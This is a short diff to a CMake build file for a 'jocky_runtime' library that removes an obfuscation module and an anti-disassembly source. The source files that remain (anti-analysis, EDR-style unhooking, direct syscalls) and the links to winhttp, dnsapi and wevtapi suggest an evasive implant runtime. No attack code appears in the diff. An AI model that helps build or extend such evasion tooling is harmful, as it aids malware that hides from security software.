@@ -4,13 +4,9 @@ project(jocky_runtime C CXX)
 set(CMAKE_C_STANDARD 11)
 set(CMAKE_CXX_STANDARD 14)
 
-# Add subdirectories for modular components
-add_subdirectory(obfuscation)
-
 # Runtime source files
 set(RUNTIME_SOURCES
     init/anti_analysis.c
-    init/anti_disasm.c
     util/mem.c
     evasion/unhook.c
     evasion/syscalls.c
@@ -89,9 +85,6 @@ endif()
 # Static library
 add_library(jocky_rt STATIC ${RUNTIME_SOURCES})
 target_include_directories(jocky_rt PUBLIC include)
-
-# Link obfuscation module
-target_link_libraries(jocky_rt PUBLIC jocky_obfuscation)
 
 if(WIN32)
     target_link_libraries(jocky_rt PUBLIC ntdll winhttp dnsapi wevtapi)
